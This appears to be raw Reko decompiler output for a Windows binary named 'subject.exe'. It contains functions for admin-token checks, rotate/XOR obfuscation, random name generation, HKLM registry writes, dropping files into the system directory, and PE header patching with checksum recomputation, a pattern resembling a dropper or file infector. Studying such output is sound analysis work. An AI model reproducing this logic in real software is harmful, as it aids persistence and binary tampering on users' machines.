// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040174B: void fn0040174B()
void fn0040174B()
{
	return;
}

// 0040174E: Register Eq_2 fn0040174E(Register (ptr Eq_3) ecx, Stack Eq_4 dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Register out ptr32 ecxOut)
Eq_2 fn0040174E(Eq_3 * ecx, Eq_4 dwArg04, ptr32 dwArg08, word32 dwArg0C, ptr32 & ecxOut)
{
	ecx->t0000 = null;
	ecx->t0004 = null;
	&ecx->t0008.u0->dw0000 = 0x00;
	word32 ecx_31;
	*ecxOut = 0x04;
	Eq_23 eax_182 = 0x80000000;
	Eq_23 ebx_183 = 0x02;
	Eq_23 dwLoc0C_184 = 0x04;
	if (dwArg0C == 0x00)
	{
		eax_182.u0 = 0xC0000000;
		ebx_183.u0 = 0x04;
		dwLoc0C_184.u0 = 0x02;
	}
	Eq_2 eax_129;
	if (dwArg04 != 0x00)
	{
		Eq_8 eax_162 = CreateFileA(dwArg04, eax_182, 0x01, null, 0x03, 0x20, null);
		ecx->t0000 = eax_162;
		if (eax_162 == (void *) ~0x00)
			goto l004017FF;
		Eq_23 eax_172 = GetFileSize(eax_162, fp - 0x08);
		ecx->t000C = eax_172;
		word32 ecx_167;
		*ecxOut = fp - 0x08;
		if (false)
		{
l004017D2:
			CloseHandle(ecx->t0000);
			goto l004017FF;
		}
		word32 ecx_178;
		*ecxOut = dwArg08;
		if (dwArg08 != null)
			*dwArg08 = (union Eq_23 *) eax_172;
	}
	Eq_8 eax_113 = CreateFileMappingA(ecx->t0000, null, ebx_183, 0x00, 0x00, 0x00);
	ecx->t0004 = eax_113;
	if (eax_113 != null)
	{
		eax_129 = MapViewOfFile(eax_113, dwLoc0C_184, 0x00, 0x00, 0x00);
		ecx->t0008 = eax_129;
		if (eax_129 != 0x00)
			return eax_129;
		CloseHandle(ecx->t0004);
		CloseHandle(ecx->t0000);
l004017FF:
		&eax_129.u0->dw0000 = 0x00;
		return eax_129;
	}
	goto l004017D2;
}

// 00401808: Register word32 fn00401808(Register (ptr Eq_141) ecx, Register out ptr32 ediOut)
word32 fn00401808(Eq_141 * ecx, ptr32 & ediOut)
{
	struct Eq_141 * esi_33 = ecx;
	Eq_4 eax_11 = ecx->t0008;
	if (eax_11 != 0x00)
		UnmapViewOfFile(eax_11);
	Eq_8 eax_18 = ecx->t0004;
	if (eax_18 != null)
		CloseHandle(eax_18);
	struct Eq_160 * esp_24 = fp - 0x08;
	if (ecx->dw0000 != 0x00)
		CloseHandle(*esp_50);
	esi_33->dw0000 = esi_33->dw0000 & 0x00;
	esi_33->t0004 = esi_33->t0004 & 0x00;
	esi_33->t0008 = esi_33->t0008 & 0x00;
	word32 edi_45;
	*ediOut = esp_24->dw0000;
	return esp_24->dw0004;
}

// 00402680: Register word32 fn00402680(Stack word32 dwArg04, Register out ptr32 esiOut, Register out ptr32 ediOut)
word32 fn00402680(word32 dwArg04, ptr32 & esiOut, ptr32 & ediOut)
{
	word32 * esp_205;
	Eq_23 eax_16 = GetCurrentProcessId();
	*dwArg04 = 0x00;
	Eq_8 eax_41 = OpenProcess(0x001F0FFF, 0x00, eax_16);
	Eq_2 dwLoc0C_180 = 0x00;
	word32 dwLoc20_352 = 0x00;
	if (OpenProcessToken(eax_41, 0x08, fp - 0x14) == 0x00)
	{
l004026E3:
		GetLastError();
		esp_205 = fp - 0x40;
		goto l004026E9;
	}
	Eq_2 eax_231 = LocalAlloc(0x00, 0x32);
	dwLoc0C_180 = eax_231;
	if (eax_231 == 0x00)
		goto l004026E3;
	if (GetTokenInformation(null, 0x02, eax_231, 0x32, fp - 0x10) != 0x00)
	{
l00402757:
		if (AllocateAndInitializeSid(fp - 44, 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, fp - 0x1C) != 0x00 && AllocateAndInitializeSid(fp - 44, 0x01, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, fp - 0x18) != 0x00)
		{
			uint32 dwArg04_345 = 0x00;
			if (*dwLoc0C_180 > 0x00)
			{
				word32 esi_365 = dwLoc0C_180 + 0x04;
				do
				{
					Eq_366 eax_373 = *esi_365;
					if (EqualSid(eax_373, null) != 0x00)
					{
						*dwArg04 = 0x00;
						dwLoc20_352 = 0x01;
						break;
					}
					if (EqualSid(eax_373, null) != 0x00)
					{
						*dwArg04 = 0x01;
						dwLoc20_352 = 0x00;
						break;
					}
					uint32 v26_395 = dwArg04_345 + 0x01;
					dwArg04_345 = v26_395;
					esi_365 = esi_365 + 0x08;
				} while (v26_395 < *dwLoc0C_180);
			}
			esp_205 = fp - 0x40;
			if (*dwArg04 == 0x00 && dwLoc20_352 == 0x00)
				*dwArg04 = 0x01;
l00402803:
			if (0x00 != 0x00)
			{
				PSID * esp_176 = esp_205 - 0x04;
				*esp_176 = (PSID *) null;
				FreeSid(*esp_176);
			}
			word32 * esp_102 = esp_205;
			if (0x00 != 0x00)
			{
				PSID * esp_160 = esp_205 - 0x04;
				*esp_160 = (PSID *) null;
				FreeSid(*esp_160);
			}
			if (dwLoc0C_180 != 0x00)
			{
				union Eq_2 * esp_155 = esp_102 - 0x04;
				*esp_155 = (union Eq_2 *) dwLoc0C_180;
				LocalFree(*esp_155);
			}
			if (0x00 != 0x00)
			{
				HANDLE * esp_150 = esp_102 - 0x04;
				*esp_150 = (HANDLE *) null;
				CloseHandle(*esp_150);
			}
			word32 * esp_111 = esp_102;
			if (eax_41 != null)
			{
				HANDLE * esp_134 = esp_102 - 0x04;
				*esp_134 = (HANDLE *) eax_41;
				CloseHandle(*esp_134);
			}
			struct Eq_471 * esp_123 = esp_111 + 0x01;
			word32 edi_122;
			*ediOut = *esp_111;
			word32 esi_124;
			*esiOut = esp_123->dw0000;
			return esp_123->dw0004;
		}
		goto l00402791;
	}
	else
	{
		if (GetLastError() == 122)
		{
			LocalFree(eax_231);
			Eq_2 eax_419 = LocalAlloc(0x00, 0x32);
			dwLoc0C_180 = eax_419;
			if (eax_419 != 0x00 && GetTokenInformation(null, 0x02, eax_419, 0x32, fp - 0x10) != 0x00)
				goto l00402757;
		}
l00402791:
		GetLastError();
l004026E9:
		goto l00402803;
	}
}

// 0040347E: Register Eq_4 fn0040347E(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
Eq_4 fn0040347E(Eq_4 dwArg04, Eq_4 dwArg08)
{
	Eq_4 esi_26 = dwArg04;
	int32 edi_10 = 0x00;
	if (dwArg08 > 0x00)
	{
		do
		{
			if (fn00407840(esi_26) == 0x00)
				return esi_26;
			edi_10 = edi_10 + 0x01;
			esi_26 = (word32) fn00407840(esi_26) + ((word32) esi_26 + 0x01);
		} while (edi_10 < dwArg08);
	}
	return esi_26;
}

// 004035A1: Register word32 fn004035A1(Register word32 esi, Register out ptr32 ediOut)
word32 fn004035A1(word32 esi, ptr32 & ediOut)
{
	struct Eq_524 * esp_14 = fp - 0x08;
	int32 edi_13 = 0x00;
	do
	{
		struct Eq_524 * esp_16 = esp_14 - 0x04;
		esp_16->dw0000 = 0x00;
		byte dl_33 = (byte) (uint32) ((uint64) (uint32) fn004047B6(dwArg00) % ((0x00 - (-edi_13 == 0x00) & 0xF8) + 0x08));
		byte * eax_36 = esp_16->dw000C + edi_13;
		*eax_36 = dl_33;
		esp_14 = esp_16;
		if (dl_33 == 0x00)
			*eax_36 = 0x01;
		edi_13 = edi_13 + 0x01;
	} while (edi_13 < 0x04);
	word32 edi_45;
	*ediOut = esp_16->dw0000;
	return esp_16->dw0004;
}

// 004035D8: void fn004035D8(Stack word32 dwArg04, Stack Eq_4 dwArg08, Stack Eq_4 dwArg0C, Stack byte bArg0F)
void fn004035D8(word32 dwArg04, Eq_4 dwArg08, Eq_4 dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			ui8 * eax_78 = dwArg04 + dwLoc0C_11;
			*eax_78 = __rol(*eax_78, cl_20) ^ al_21;
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
	return;
}

// 00403634: void fn00403634(Stack Eq_4 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack byte bArg0F)
void fn00403634(Eq_4 dwArg04, word32 dwArg08, word32 dwArg0C, byte bArg0F)
{
	int32 dwLoc0C_11 = dwLoc0C & 0x00;
	byte cl_20 = dwArg0C->b0000;
	byte al_21 = dwArg0C->b0001;
	if (dwArg08 > 0x00)
	{
		do
		{
			byte * eax_78 = dwArg04 + dwLoc0C_11;
			*eax_78 = __ror(*eax_78 ^ al_21, cl_20);
			int32 v18_123 = dwLoc0C_11 + 0x01;
			dwLoc0C_11 = v18_123;
		} while (v18_123 < dwArg08);
	}
	return;
}

// 00403690: Register byte fn00403690(Register int32 ebx, Stack word32 dwArg00, Register out ptr32 ebxOut, Register out ptr32 esiOut, Register out ptr32 ediOut)
byte fn00403690(int32 ebx, word32 dwArg00, ptr32 & ebxOut, ptr32 & esiOut, ptr32 & ediOut)
{
	byte al_47;
	byte bl_27 = (byte) dwArg00;
	word32 * esp_105 = fp - 0x10;
	word32 esi_104 = (uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x1A) + 0x61;
	if (dwArg00 != 0x04)
	{
		if (dwArg00 == 0x01)
		{
			esp_105 = fp - 0x14;
			al_47 = (byte) ((uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x0A) + 0x30);
l0040372B:
			struct Eq_702 * esp_52 = esp_105 + 0x01;
			word32 edi_51;
			*ediOut = *esp_105;
			word32 esi_53;
			*esiOut = esp_52->dw0000;
			word32 ebx_55;
			*ebxOut = esp_52->dw0004;
			return al_47;
		}
		if ((bl_27 & 0x02) != 0x00)
		{
			esp_105 = fp - 0x14;
			esi_104 = (uint32) ((uint64) (uint32) fn004047B6(0x00) % 0x1A) + 0x41;
		}
		word32 * esp_106 = esp_105 - 0x04;
		*esp_106 = 0x00;
		word32 * esp_115 = esp_106;
		if (((byte) fn004047B6(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x04) != 0x00)
		{
			*(esp_106 - 0x04) = 0x00;
			uint64 edx_eax_162 = (uint64) (uint32) fn004047B6(dwArg00);
			*(esp_106 - 0x08) = 0x1A;
			esp_115 = esp_106 - 0x04;
			esi_104 = (uint32) (edx_eax_162 % *(esp_106 - 0x08)) + 0x61;
		}
		word32 * esp_121 = esp_115 - 0x04;
		*esp_121 = 0x00;
		esp_105 = esp_121;
		if (((byte) fn004047B6(dwArg00) & 0x01) != 0x00 && (bl_27 & 0x01) != 0x00)
		{
			*(esp_121 - 0x04) = 0x00;
			uint64 edx_eax_141 = (uint64) (uint32) fn004047B6(dwArg00);
			*(esp_121 - 0x08) = 0x0A;
			esp_105 = esp_121 - 0x04;
			esi_104 = (uint32) (edx_eax_141 % *(esp_121 - 0x08)) + 0x30;
		}
	}
	al_47 = (byte) esi_104;
	goto l0040372B;
}

// 0040372F: void fn0040372F(Register word32 ebx, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn0040372F(word32 ebx, word32 dwArg08, word32 dwArg0C)
{
	struct Eq_826 * esp_10 = fp - 0x0C;
	int32 esi_15 = dwArg08;
	if (dwArg0C > dwArg08)
	{
		esp_10 = fp - 0x10;
		esi_15 = (word32) (uint32) ((uint64) (uint32) fn004047B6(0x00) % (dwArg0C - dwArg08)) + dwArg08;
	}
	int32 ebx_32 = esp_10->dw0010;
	if (esi_15 > 0x00)
	{
		do
		{
			*(esp_10 - 0x04) = esp_10->dw001C;
			Eq_889 esi_70;
			Eq_890 edi_71;
			byte al_72 = fn00403690(ebx_32, ebx, out ebx_32, out esi_70, out edi_71);
			*((word32) edi_71 + ebx_32) = al_72;
		} while ((word32) edi_71 + 0x01 < esi_70);
	}
	word32 * esp_41 = esp_10 - 0x04;
	*esp_41 = 0x02;
	byte * ebx_43;
	word32 esi_44;
	int32 edi_45;
	byte al_46 = fn00403690(ebx_32, ebx, out ebx_43, out esi_44, out edi_45);
	*ebx_43 = al_46;
	ebx_43[edi_45] = ebx_43[edi_45] & 0x00;
	*esp_41 = 0x01;
	return;
}

// 00403CE3: void fn00403CE3(Register word32 esi, Stack ptr32 dwArg04)
void fn00403CE3(word32 esi, ptr32 dwArg04)
{
	fn00407750(dwArg04);
	*(fp - 0x10) = fp->dw0008;
	*(fp - 0x14) = 4260434;
	*(fp - 0x18) = (union Eq_23 *) fn0040347E(dwArg00, dwArg04);
	*(fp - 0x1C) = fp->dw0004;
	fn00407760(dwArg00);
	return;
}

// 00403DC6: void fn00403DC6(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08, Stack word32 dwArg0C)
void fn00403DC6(Eq_4 dwArg04, Eq_4 dwArg08, word32 dwArg0C)
{
	Eq_8 eax_29 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x02, 0x20, null);
	if (eax_29 != (void *) ~0x00 && dwArg08 != 0x00)
	{
		WriteFile(eax_29, dwArg08, dwArg0C, fp + 0x04, null);
		CloseHandle(eax_29);
	}
	return;
}

// 00403E63: Register word32 fn00403E63(Stack Eq_4 dwArg04, Register out Eq_980 esiOut)
word32 fn00403E63(Eq_4 dwArg04, Eq_980 & esiOut)
{
	*esiOut = esi;
	fn0040174B();
	word32 ecx_19;
	if (fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x01, out ecx_19) == null)
		return 0x00;
	else
	{
		word32 edi_35;
		word32 esi_36;
		*esiOut = fn00401808(fp - 0x18, out edi_35);
		*(fp - 0x1C) = 0x01;
		return *(fp - 0x1C);
	}
}

// 00403F05: void fn00403F05(Stack Eq_4 dwArg04)
void fn00403F05(Eq_4 dwArg04)
{
	SetFileAttributesA(dwArg04, 0x20);
	DeleteFileA(dwArg04);
	return;
}

// 0040406E: void fn0040406E(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
void fn0040406E(Eq_4 dwArg04, Eq_4 dwArg08)
{
	if (dwArg08 >= 0x00015000)
	{
		SetFileAttributesA(dwArg04, 0x20);
		Eq_8 eax_100 = CreateFileA(dwArg04, 0xC0000000, 0x03, null, 0x03, 0x20, null);
		Eq_8 edi_102 = eax_100;
		if (eax_100 != (void *) ~0x00)
		{
			ptr32 esp_135;
			Eq_23 eax_110 = GetFileSize(eax_100, fp - 0x08);
			if (eax_110 > dwArg08)
			{
				SetFilePointer(eax_100, dwArg08, null, 0x00);
				SetEndOfFile(eax_100);
				esp_135 = fp - 0x14;
			}
			else
			{
				SetFilePointer(eax_100, 0x00, null, 0x02);
				int32 eax_178 = (int32) ((int64) (dwArg08 - eax_110) / 0x00080000);
				if (eax_178 > 0x00)
				{
					int32 dwArg08_215 = eax_178;
					do
					{
						WriteFile(eax_100, 4272592, 0x00080000, fp - 0x08, null);
						int32 v20_230 = dwArg08_215 - 0x01;
						dwArg08_215 = v20_230;
					} while (v20_230 != 0x00);
				}
				WriteFile(esp_199->t0000, esp_199->t0004, esp_199->t0008, esp_199->t000C, esp_199->t0010);
			}
			HANDLE * esp_136 = esp_135 - 0x04;
			*esp_136 = (HANDLE *) edi_102;
			CloseHandle(*esp_136);
			*esp_136 = (HANDLE *) (void *) 0x01;
			return;
		}
	}
	return;
}

// 0040464B: void fn0040464B(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08, Stack word32 dwArg0C, Stack word32 dwArg10)
void fn0040464B(Eq_4 dwArg04, Eq_4 dwArg08, word32 dwArg0C, word32 dwArg10)
{
	if (RegCreateKeyA(dwArg04, dwArg08, fp + 0x08) == null)
	{
		RegSetValueExA(dwArg08, dwArg0C, 0x00, 0x01, dwArg10, fn00407840(dwArg10));
		RegCloseKey(dwArg08);
		return;
	}
	else
		return;
}

// 00404691: void fn00404691(Stack word32 dwArg04, Stack Eq_23 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10)
void fn00404691(word32 dwArg04, Eq_23 dwArg08, word32 dwArg0C, ptr32 dwArg10)
{
	word32 esi_116 = 0x00;
	ptr32 esp_120 = fp - 0x0114;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == null)
	{
		while (true)
		{
			union Eq_23 * esp_50 = esp_120 - 0x04;
			*esp_50 = 0x0104;
			*(esp_50 - 0x04) = fp - 0x0110;
			*(esp_50 - 0x08) = esi_116;
			*(esp_50 - 0x0C) = (union Eq_23 *) dwLoc08;
			Eq_1149 eax_60 = RegEnumKeyA(*(esp_50 - 0x0C), *(esp_50 - 0x08), *(esp_50 - 0x04), *esp_50);
			esp_120 = (char *) esp_50 + 0x04;
			if (eax_60 != null)
				break;
			if (dwArg0C != eax_60)
			{
				ui32 v13_92 = dwLoc0C & eax_60;
				*esp_50 = (union Eq_23 *) dwArg10;
				*(esp_50 - 0x04) = fp - 0x0C;
				*(esp_50 - 0x08) = fp - 0x0110;
				*(esp_50 - 0x0C) = (union Eq_23 *) dwArg08;
				*(esp_50 - 0x10) = (union Eq_23 *) dwArg04;
				dwLoc0C = v13_92;
				word32 esp_112;
				word32 ebp_113;
				byte SCZO_114;
				word32 eax_115;
				byte SZO_117;
				byte C_118;
				byte Z_119;
				dwArg0C();
				esp_120 = esp_112 + 0x14;
				if (v13_92 != 0x00)
					goto l00404701;
			}
			esi_116 = esi_116 + 0x01;
		}
		*esp_50 = 0x01;
		esp_120 = (char *) esp_50 + 0x04;
l00404701:
		union Eq_23 * esp_74 = esp_120 - 0x04;
		*esp_74 = (union Eq_23 *) dwLoc08;
		RegCloseKey(*esp_74);
	}
	return;
}

// 0040470F: void fn0040470F(Stack Eq_4 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack word32 dwArg10)
void fn0040470F(Eq_4 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10)
{
	word32 ebx_114 = 0x00;
	ptr32 esp_116 = fp - 0x0820;
	if (RegOpenKeyA(dwArg04, dwArg08, fp - 0x08) == null)
	{
		while (true)
		{
			LPDWORD * esp_62 = esp_116 - 0x04;
			*esp_62 = (LPDWORD *) (fp - 0x0C);
			*(esp_62 - 0x04) = fp + ~0x0817;
			*(esp_62 - 0x08) = fp - 0x18;
			*(esp_62 - 0x0C) = 0x00;
			*(esp_62 - 0x10) = fp - 0x14;
			*(esp_62 - 0x14) = fp - 0x0418;
			*(esp_62 - 0x18) = ebx_114;
			*(esp_62 - 0x1C) = (union Eq_23 *) dwLoc08;
			Eq_1149 eax_85 = RegEnumValueA(*(esp_62 - 0x1C), *(esp_62 - 0x18), *(esp_62 - 0x14), *(esp_62 - 0x10), *(esp_62 - 0x0C), *(esp_62 - 0x08), *(esp_62 - 0x04), *esp_62);
			esp_116 = (char *) esp_62 + 0x04;
			if (eax_85 != null)
				break;
			if (dwLoc18 == 0x01 && dwArg0C != eax_85)
			{
				ui32 v14_122 = dwLoc10 & eax_85;
				*esp_62 = (LPDWORD *) dwArg10;
				*(esp_62 - 0x04) = fp - 0x10;
				*(esp_62 - 0x08) = fp - 0x0418;
				*(esp_62 - 0x0C) = (union Eq_23 *) dwArg08;
				*(esp_62 - 0x10) = (union Eq_23 *) dwArg04;
				dwLoc10 = v14_122;
				word32 esp_142;
				word32 ebp_143;
				byte SCZO_144;
				word32 eax_146;
				word32 esi_147;
				byte SZO_148;
				byte C_149;
				byte Z_150;
				dwArg0C();
				esp_116 = esp_142 + 0x14;
				if (v14_122 != 0x00)
					goto l004047A7;
			}
			ebx_114 = ebx_114 + 0x01;
		}
		*esp_62 = (LPDWORD *) (DWORD *) 0x01;
		esp_116 = (char *) esp_62 + 0x04;
l004047A7:
		union Eq_23 * esp_100 = esp_116 - 0x04;
		*esp_100 = (union Eq_23 *) dwLoc08;
		RegCloseKey(*esp_100);
	}
	return;
}

// 004047B6: Register word32 fn004047B6(Stack Eq_4 dwArg04)
word32 fn004047B6(Eq_4 dwArg04)
{
	if (dwArg04 != 0x00 || globals->dw4131CC == 0x00)
	{
		fn00407F35(GetTickCount());
		globals->dw4131CC = fn00407F3F();
	}
	return fn00407F3F();
}

// 004047E2: Register ui32 fn004047E2(Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
ui32 fn004047E2(Eq_4 dwArg04, Eq_4 dwArg08)
{
	fn004076F0(fp - 88, 0x00, 0x44);
	return 0x00 - (-CreateProcessA(dwArg04, dwArg08, null, null, 0x00, 0x00, 0x00, 0x00, fp - 88, fp - 0x14) == 0x00) & dwLoc14;
}

// 00404A18: Register word32 fn00404A18(Register word32 ebx, Register ptr32 ebp, Register word32 esi, Register out ptr32 ediOut)
word32 fn00404A18(word32 ebx, ptr32 ebp, word32 esi, ptr32 & ediOut)
{
	*ediOut = edi;
	if (globals->t4938F0 == 0x00)
		fn00404691(0x80000002, fn0040347E(4260434, 0x04), 0x0040494A, fp - 0x08);
	else
	{
		fn00403CE3(esi, fp - 0x041C);
		*(fp - 0x052C) = fp - 0x041C;
		*(fp - 0x0530) = 4797664;
		word32 edi_176;
		*ediOut = fn00407750(dwArg00);
		*(fp - 1332) = fp - 0x08;
		*(fp - 1336) = 0x004048B6;
		*(fp - 0x053C) = fp - 0x041C;
		*(fp - 0x0540) = 0x80000002;
		fn0040470F(dwArg00, dwArg04, dwArg08, dwArg0C);
	}
	globals->dw4938F4 = dwLoc08 & 0x00;
	if ((dwLoc08 & 0x00) == 0x00)
	{
		*(fp - 1316) = esi;
		*(fp - 0x0528) = 0x0104;
		*(fp - 0x052C) = fp - 0x0520;
		GetSystemDirectoryA(*(fp - 0x052C), *(fp - 0x0528));
		do
		{
			*(fp - 0x1C) = *(fp - 0x1C) & 0x00;
			*(fp - 0x0528) = 0x0041078D;
			*(fp - 0x052C) = fp - 0x1C;
			fn00407750(dwArg00);
			*(fp - 0x0528) = 0x04;
			*(fp - 0x052C) = 0x04;
			*(fp - 0x0530) = 0x02;
			*(fp - 1332) = fp - 0x1C;
			*(fp - 1332) = (word32) fn00407840(dwArg00) + (fp - 0x1C);
			fn0040372F(ebx, dwArg04, dwArg08);
			*(fp - 1336) = fp - 0x1B;
			fn0040C9AC(fp - 0x04, dwArg00);
			*(fp - 0x053C) = fp - 0x0520;
			*(fp - 0x0540) = fp - 0x041C;
			fn00407750(dwArg00);
			*(fp - 0x0544) = 0x0040F044;
			*(fp - 0x0548) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x054C) = fp - 0x1C;
			*(fp - 0x0550) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x0554) = 0x004101DC;
			*(fp - 0x0558) = fp - 0x041C;
			fn00407760(dwArg00);
			*(fp - 0x055C) = fp - 0x041C;
			int32 esi_124;
		} while (fn00403E63(dwArg00, out esi_124) == 0x00 || esi_124 >= ~0x08);
		*(fp - 0x0528) = fp - 0x1C;
		*(fp - 0x052C) = 4797404;
		fn00407760(dwArg00);
		*(fp - 0x0530) = fp - 0x041C;
		*(fp - 1332) = 4797924;
		word32 edi_141;
		*ediOut = fn00407750(dwArg00);
	}
	*(fp - 1316) = 0x01;
	return ebx;
}

// 00404C49: Register word32 fn00404C49(Register ptr32 ebp, Register out ptr32 ediOut)
word32 fn00404C49(ptr32 ebp, ptr32 & ediOut)
{
	Eq_4 edi_16 = fn00407750(fp - 0x0310);
	*ediOut = edi_16;
	Eq_4 ecx_21 = *(fp - 0x041C);
	*(fp - 0x041C) = 0x0104;
	*(fp - 0x0420) = fp - 0x0108;
	*(fp - 0x0424) = 0x00;
	GetModuleFileNameA(*(fp - 0x0424), *(fp - 0x0420), *(fp - 0x041C));
	*(fp - 0x041C) = 0x00;
	*(fp - 0x0420) = 0x00;
	*(fp - 0x0424) = fp - 0x0414;
	*(fp - 0x0428) = 0x00;
	*(fp - 0x042C) = fp - 0x0310;
	Eq_4 ecx_48 = fn004078BB(ecx_21, fp - 0x04, edi_16, dwArg00, dwArg04);
	*(fp - 0x0430) = 0x00;
	*(fp - 0x0434) = 0x00;
	*(fp - 1080) = fp - 0x020C;
	*(fp - 0x043C) = 0x00;
	*(fp - 0x0440) = fp - 0x0108;
	Eq_4 ecx_61 = fn004078BB(ecx_48, fp - 0x04, edi_16, dwArg00, dwArg04);
	*(fp - 0x0444) = fp - 0x020C;
	*(fp - 0x0448) = fp - 0x0414;
	return 0x00 - (-fn0040C920(ecx_61, dwArg00, dwArg04) == 0x00) + 0x01;
}

// 00404CC5: Register ui32 fn00404CC5(Stack (ptr Eq_997) dwArg04, Stack uint32 dwArg08)
ui32 fn00404CC5(Eq_997 * dwArg04, uint32 dwArg08)
{
	if (dwArg08 >= 0x44 && (dwArg04->b0000 == 77 && dwArg04->b0001 == 0x5A))
	{
		word32 * eax_41 = dwArg04 + (word32) dwArg04->w003C / 0x003E;
		uint32 edx_44 = eax_41 - dwArg04;
		if (edx_44 <= dwArg08 + ~0x03)
			return ~(0x00 - (0x4550 - *eax_41 == 0x00)) & edx_44;
	}
	return 0x00;
}

// 00404D04: Register (ptr Eq_2082) fn00404D04(Stack (ptr Eq_997) dwArg04, Stack word32 dwArg08, Stack uint32 dwArg0C)
Eq_2082 * fn00404D04(Eq_997 * dwArg04, word32 dwArg08, uint32 dwArg0C)
{
	struct Eq_2082 * eax_39;
	ptr32 eax_23 = fn00404CC5(dwArg04, dwArg0C);
	if (eax_23 != 0x00)
	{
		struct Eq_2096 * ecx_61 = dwArg04 + eax_23 / 0x0028;
		uint32 edx_65 = ecx_61->dw0074;
		if (edx_65 >= dwArg08)
		{
			uint32 ecx_69 = (word32) ecx_61->w0006;
			uint32 esi_70 = ecx_61->a0070[dwArg08].dw0000;
			uint32 edi_100 = 0x00;
			eax_39 = (struct Eq_2082 *) ((char *) (&ecx_61->dw0074 + 0x03 + (edx_65 * 0x08) / 0x0078) + 0x04);
			if (true)
			{
				do
				{
					if (eax_39 - dwArg04 >= dwArg0C + ~0x03)
						goto l00404D6D;
					uint32 edx_88 = eax_39->dw0000;
					if (eax_39->dw0000 + edx_88 > esi_70 && edx_88 <= esi_70)
						break;
					eax_39 = eax_39 + 0x01;
					edi_100 = edi_100 + 0x01;
				} while (edi_100 < ecx_69);
				if (edi_100 < ecx_69)
					return eax_39;
			}
		}
	}
l00404D6D:
	eax_39 = null;
	return eax_39;
}

// 00404FC5: void fn00404FC5(Register ptr32 ebp, Stack Eq_4 dwArg04, Stack Eq_4 dwArg08)
void fn00404FC5(ptr32 ebp, Eq_4 dwArg04, Eq_4 dwArg08)
{
	fn0040174B();
	word32 ecx_28;
	struct Eq_997 * eax_29 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_28);
	if (eax_29 == null)
		return;
	ptr32 eax_74 = fn00404CC5(eax_29, dwLoc08);
	if (eax_74 != 0x00)
	{
		struct Eq_2170 * eax_135 = fn00404D04(eax_29, 0x03, dwLoc08);
		if (eax_135 != null)
		{
			struct Eq_2177 * esi_142 = eax_29 + eax_74 / 0x0028;
			esi_142->dw008C = 0x10;
			uint32 ecx_146 = eax_135->dw0004;
			eax_135->dw0000 = 0x10;
			eax_135->dw0008 = 0x10;
			ui32 ecx_147 = ecx_146 + 0x10;
			if (((word16) (ecx_146 + 0x10) & 0x0FFF) != 0x00)
				ecx_147 = (ecx_146 + 0x10 >> 0x0C) + 0x01 << 0x0C;
			esi_142->dw0050 = ecx_147;
			word32 ecx_156 = eax_135->dw000C;
			uint32 edi_159 = eax_135->dw0008 + ecx_156;
			cui16 di_160 = (word16) edi_159;
			if (edi_159 < dwArg08)
				di_160 = (word16) dwArg08;
			Eq_4 eax_170 = eax_29 + ecx_156 / 0x0028;
			if (eax_170 - eax_29 < 0x10)
				fn004076F0(eax_170, 0x00, 0x10);
			word32 eax_181 = esi_142->dw00EC;
			if (eax_181 != 0x00)
				esi_142->dw0028 = eax_181;
l0040508E:
			word32 edi_95;
			if (fn00401808(fp - 0x18, out edi_95) != 0x00)
			{
				*(fp - 0x28) = edi_95;
				*(fp - 44) = (union Eq_4 *) dwArg04;
				fn0040406E(dwArg00, dwArg04);
			}
			*(fp - 0x28) = (union Eq_4 *) dwArg04;
			fn00405108(dwArg00);
			return;
		}
	}
	goto l0040508E;
}

// 004050B5: Register uint32 fn004050B5(Stack (ptr Eq_997) dwArg04, Stack ui32 dwArg08)
uint32 fn004050B5(Eq_997 * dwArg04, ui32 dwArg08)
{
	uint32 ecx_11 = 0x00;
	uint32 dwLoc08_16 = 0x00;
	if (dwArg08 >> 0x01 != 0x00)
	{
		word16 * edx_43 = dwArg04;
		uint32 esi_47 = dwArg08 >> 0x01;
		do
		{
			uint32 ecx_53 = ecx_11 + (word32) (*edx_43);
			ecx_11 = (ecx_53 & 0xFFFF) + (ecx_53 >> 0x10);
			edx_43 = edx_43 + 0x01;
			esi_47 = esi_47 - 0x01;
		} while (esi_47 != 0x00);
		dwLoc08_16 = ecx_11;
	}
	uint32 eax_28 = ecx_11 >> 0x10;
	return DPB(eax_28, (word16) eax_28 + (word16) dwLoc08_16, 0) + dwArg08;
}

// 00405108: void fn00405108(Stack Eq_4 dwArg04)
void fn00405108(Eq_4 dwArg04)
{
	fn0040174B();
	word32 ecx_32;
	struct Eq_997 * eax_33 = fn0040174E(fp - 0x18, dwArg04, fp - 0x08, 0x00, out ecx_32);
	if (eax_33 != null)
	{
		ptr32 eax_60 = fn00404CC5(eax_33, dwLoc08 & 0x00);
		if (eax_60 != 0x00)
		{
			ui32 * esi_81 = eax_33 + (eax_60 + 88) / 0x0028;
			if (eax_33[(eax_60 + 88) / 0x0028] != 0x00)
			{
				*esi_81 = *esi_81 & 0x00;
				*esi_81 = fn004050B5(eax_33, dwLoc08 & 0x00);
			}
